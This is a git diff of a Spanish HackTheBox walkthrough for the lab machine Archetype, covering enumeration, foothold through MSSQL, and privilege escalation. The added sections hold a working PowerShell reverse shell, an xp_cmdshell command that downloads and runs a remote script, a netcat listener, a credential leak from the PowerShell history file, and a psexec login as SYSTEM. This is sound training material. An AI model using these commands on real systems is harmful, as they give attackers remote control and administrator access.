@@ -6,7 +6,7 @@ permalink: "blog/starting-point"
 published: yes
 ---
 
-## Introducción
+# Introducción
 
 Bueno todos sabemos que HackTheBox es una plataforma ahora mismo muy pulida para aprender a hackear máquinas de diferentes sistemas operativos, tanto como `Linux`,`Windows` o `FreeBSD`, en este post se explicará de una forma mas interactiva para empezar a hackear una máquina y algunos pasos fundamentales que hay que seguir, por supuesto el tutorial esta en la misma plataforma de `HackTheBox` pero hay muchos conceptos que dan por hecho que el usuario conoce, en mi caso explicaré cada uno de ellos para profundizar y tener un aprendizaje más óptimo de lo que estamos haciendo.
 
@@ -22,7 +22,7 @@ openvpn rebcesp-startingpoint.ovpn
 ```
 
 
-## Enumeracion
+# Enumeración
 
 HTB nos proporciona una IP para empezar a hackear que en esta ocasión es `10.10.10.27`, lo primero que tenemos que hacer es el reconocimiento de esta máquina es decir, listar sus puertos abiertos junto a los servicios que estan corriendo en cada uno de ellos, para eso se utiliza una herramienta que es `navaja suiza` llamada `Nmap` lo cual es `escaner de puertos MUY potente`. Vamos a usar los parámetros de nmap para poder enumerar los puertos que estan abiertos y servicios que estan corriendo junto a scriptss que contiene la misma herramienta para automatizar el proceso.
 
@@ -164,7 +164,7 @@ Los paquetes se guardan en la tabla `syssispackages`. Esta tabla incluye una col
 ```
 Podemos ver que en este archivo de configuración contiene una cadena de conexión `SQL` que son las credenciales de usuario local de Windows `ARCHETYPE\sql_svc`
 
-## Foothold
+# Foothold
 
 Vamos a intentar conectar con el SQL Server usando un script en python de `Impacket` el cual es `mssqlclient.py`
 
@@ -255,5 +255,90 @@ Vamos a seguir enumerando, intentaremos obtener una shell adecuada, lo haremos c
 ```powershell
  $client = New-Object System.Net.Sockets.TCPClient("10.10.14.3",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() 
 ```
+Vamos a levantar un servidor en python para alojar el archivo
+
+```python
+python3 -m http.server 8000
+```
+
+Luego de eso ponemos en escucha el `netcat` en el puerto `4444`, podemos permitir usar `ufw` para permitir las devoluciones de llamada en el puerto 8000 y 4444 a nuestra maquina.
+
+### ¿Qué es Netcat & UFW?
+
+_Netcat_:  Es un programa creado para uso de los administradores de redes y por supuesto para los Hackers. Netcat permite a través de intérprete de comandos y comn una sintaxis sencilla abrir puertos `TCP/UDP` (quedando netcat a la escucha), asociar una shell a un puerto en concreto.
+
+_UFW_: Significa `Uncomplicated Firewall` y hacen referencia a una aplicación que tiene como objetivo establecer reglas en `iptables`, las tablas de firewalla nativas en Linux. Puesto que iptables tiene una sintaxis relativamente compleja, utilizar UFW para realizar su configuración es una alternativa útil sin escatimar en seguridad.
+
+Despues de conocer estos dos conceptos lanzamos el comando del netcat y haboilitamos los puertos mencionanos anteriormente para habilitar la llamada de devolución
+
+```bash
+nc -lvnp 4444
+ufw allow from 10.10.10.27 proto tcp to any port 8000,4444
+```
+
+Ahora teniendo esto vamos a usar el comando para descargar y ejecutar una shell reversa a través de la función `xp_cmdshell` claramente lo tenemos que lanzar dentro del `SQL>`
+
+```powershell
+ xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.14.3/shell.ps1\");" 
+```
+
+## Shell Recibida
+```bash
+─[rebcesp@parrot]─[~/Descargas]
+└──╼ $nc -lvnp 4444
+listening on [any] 4444 ...
+ufw allow from 10.10.10.27 proto tcp to any port 8000,4444
+connect to [10.10.14.39] from (UNKNOWN) [10.10.10.27] 49736
+# whoami
+archetype\sql_svc
+# ls
 
 
+    Directory: C:\Windows\system32
+
+```
+La shell es recibida como `sql_svc`, y ahora nosotros podemos conseguir la flag de `user.txt` dentro de la carpta `Desktop`
+
+# Elevación de Privilegios
+
+Como se trata de una cuenta de usuario normal y de una cuenta de servicio, vale la pena comprobar si hay archivos de acceso frecuente o comandos ejecutados. podemos usar el siguiente para acceder al archivo historico de `Powershell`.
+
+```bash
+#  type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt 
+net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
+exit
+```
+
+Esto nos revela que la unidad de copias de seguridad se ha asignado con las credenciales del administrador local. Podemos usar `psexec.py` de impacket para obtener una shell privilegiada.
+
+## psexec.py
+
+La forma en que funciona el script es que Impacket cargará la utilidad RemComSvc en un recurso compartido de escritura en el sistema remoto y luego lo registrará como un servicio de Windows.
+
+Esto resultará en tener un shell interactivo disponible en el sistema remoto de Windows a través del puerto `TCP/445`
+
+# Accediendo como administrador
+
+```bash
+┌─[rebcesp@parrot]─[~/Descargas]
+└──╼ $python3 psexec.py administrator@10.10.10.27
+Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
+
+Password:
+[*] Requesting shares on 10.10.10.27.....
+[*] Found writable share ADMIN$
+[*] Uploading file IwuLZZKe.exe
+[*] Opening SVCManager on 10.10.10.27.....
+[*] Creating service ysoS on 10.10.10.27.....
+[*] Starting service ysoS.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17763.107]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+nt authority\system
+```
+
+Con esto estaría todo el trabajo concluido y podemos la flag de `root` en la carpeta de Desktop.
+
+Muchas gracias,
